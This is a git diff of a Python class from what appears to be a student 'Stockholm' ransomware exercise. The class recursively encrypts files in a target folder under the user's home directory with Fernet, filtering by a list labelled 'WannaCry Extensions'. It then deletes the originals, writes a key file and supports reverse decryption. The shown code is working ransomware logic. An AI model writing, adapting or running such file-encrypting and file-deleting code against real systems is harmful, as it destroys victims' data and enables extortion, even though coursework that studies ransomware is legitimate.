@@ -6,7 +6,7 @@
 #    By: ndahib <ndahib@student.1337.ma>            +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/12/13 10:55:54 by ndahib            #+#    #+#              #
-#    Updated: 2025/12/13 12:42:35 by ndahib           ###   ########.fr        #
+#    Updated: 2025/12/15 14:03:45 by ndahib           ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -17,22 +17,12 @@ from cryptography.fernet import Fernet, InvalidToken
 
 TARGET_DIR = Path.home() / constants.TARGET_DIR
 
-class Ransomwarer():
+class Stockholm():
     def __init__(self, argv):
-        self.args = argv
         self.target_directory = Path(TARGET_DIR)
         self.silent = argv.silent
         self.reverse: str = argv.reverse
         self.count = 0
-        key : bytes = self.reverse.encode()
-        if not self.reverse:
-            key = Fernet.generate_key()
-            with open("stokholm.key", "wb") as key_file:
-                key_file.write(key)
-        self.fernet = Fernet(key=key)
-        if len(key) < 16:
-            print(constants.RED_COLOR+"Key must be at least 16 characters long"+constants.DEF_COLOR)
-            exit(1)
 
     def __print(self, msg, flag):
         if self.silent:
@@ -57,8 +47,8 @@ class Ransomwarer():
             content = file.read_bytes()
 
             encrypted_content = self.fernet.encrypt(content)
-            if (file.suffix != constants.EXTENSION):
-                encripted_file = file.with_suffix(file.suffix + f"{constants.EXTENSION}")
+            if (file.suffix != constants.FT_EXTENSION):
+                encripted_file = file.with_suffix(file.suffix + f"{constants.FT_EXTENSION}")
             encripted_file.write_bytes(encrypted_content)
 
             file.unlink()
@@ -72,16 +62,16 @@ class Ransomwarer():
             content = file.read_bytes()
             decrypted_content = self.fernet.decrypt(content)
 
-            if not file.suffix.endswith(constants.EXTENSION):
+            if not file.suffix.endswith(constants.FT_EXTENSION):
                 raise ValueError("Invalid encrypted file extension")
 
-            decrypted_suffix = file.suffix.removesuffix(constants.EXTENSION)
+            decrypted_suffix = file.suffix.removesuffix(constants.FT_EXTENSION)
             decrypted_file = file.with_suffix(decrypted_suffix)
             decrypted_file.write_bytes(decrypted_content)
 
             file.unlink()
             
-            self.__print(f"Deccryption of {file.name} passed succefuly", constants.SUCCES_FLAG)
+            self.__print(f"Decryption of {file.name} passed succesfuly", constants.SUCCES_FLAG)
     
         except InvalidToken:
             self.__print(
@@ -102,13 +92,13 @@ class Ransomwarer():
         for item in dir.rglob("*"):
             try:
                 if item.is_file():
-                    if not item.suffix.lower() in constants.EXTENSIONS:
+                    if not item.suffix.lower() in constants.EXTENSIONS and item.suffix.lower() != constants.FT_EXTENSION:
                         self.__print(f"Skipping file {item.name} because his extension {item.suffix} not in WannaCry Extensions", constants.WARNING_FLAG)
-                        continue
-                    if not self.reverse and item.name.endswith(constants.EXTENSION):
                         continue
                     self.count += 1
                     if self.reverse:
+                        if not item.name.endswith(constants.FT_EXTENSION):
+                            continue
                         self.__decrypt_file(item)
                     else:
                         self.__encrypt_file(item)
@@ -116,7 +106,30 @@ class Ransomwarer():
                 self.__print(f"{e}", constants.WARNING_FLAG)
                 continue
     
-
-            
+    def __is_encrypted(self):
+        for item in self.target_directory.rglob("*"):
+            if item.is_file() and item.name.endswith(constants.FT_EXTENSION):
+                return True
+        return False
+                    
     def execute(self):
+        if self.reverse:
+            if os.path.isfile(self.reverse):
+                with open(self.reverse, "rb") as f:
+                    key = f.read()
+        else:
+            if self.__is_encrypted():
+                self.__print(f"the files are already encrypted", constants.WARNING_FLAG)
+                exit(1)
+            key = Fernet.generate_key()
+            with open("stokholm.key", "wb") as key_file:
+                key_file.write(key)
+        if not key:
+            self.__print(f"{self.reverse} not valid", constants.ERROR_FLAG)
+            exit(1)
+        self.fernet = Fernet(key=key)
+        if len(key) < 16:
+                print(constants.RED_COLOR+"Key must be at least 16 characters long"+constants.DEF_COLOR)
+                exit(1)
+            
         self.__find_files(self.target_directory)
